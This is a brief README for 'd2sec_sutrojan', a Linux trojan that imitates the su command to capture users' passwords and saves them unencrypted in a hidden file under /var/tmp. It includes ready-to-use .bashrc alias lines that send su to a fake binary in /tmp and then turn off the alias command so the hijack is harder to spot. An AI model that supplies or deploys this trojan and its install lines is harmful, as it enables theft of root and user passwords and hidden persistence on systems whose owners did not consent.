Local Tool
-----------

d2sec_sutrojan is a ... su trojan horse for Linux. It simulates su
binary and handles perfectly terminal with termios API.

Passwords are saved in a file named: "/var/tmp/.zmanmi6818". This file
is not encrypted.

To install this trojan horse for example with bash, add this line in
user's .bashrc file:

alias su='if /usr/bin/test -x /tmp/su 1>/dev/null 2>&1; then /tmp/su; else su; fi; unalias su; #' 1>/dev/null 2>&1
alias alias='#' 1>/dev/null 2>&1

where /tmp/su is our su trojan horse

